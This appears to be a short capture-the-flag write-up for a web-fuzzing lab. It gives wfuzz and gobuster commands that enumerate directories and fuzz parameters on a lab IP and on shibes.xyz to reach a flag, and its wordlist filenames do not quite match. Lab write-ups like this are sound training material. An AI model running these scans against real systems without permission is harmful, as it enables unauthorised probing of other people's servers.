# [Web Exploit] Santa's watching

IP: 10.10.152.216

### Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)
- `wfuzz -c -z file,big.txt -d “breed=FUZZ” -u http://shibes.xyz/api.php`

### Use GoBuster (against the target you deployed -- not the shibes.xyz domain) to find the API directory. What file is there?
- `wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/big.txt`
- `gobuster dir -u 10.10.152.216 -w big.txt -x "php"`
- `site-log.php`

### Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?
- `wget https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist`
- `wfuzz -c -z file,date_wordlists_tryhackme.txt -u http://10.10.152.216/api/site-log.php?date=FUZZ`
- :) You can find the flag there 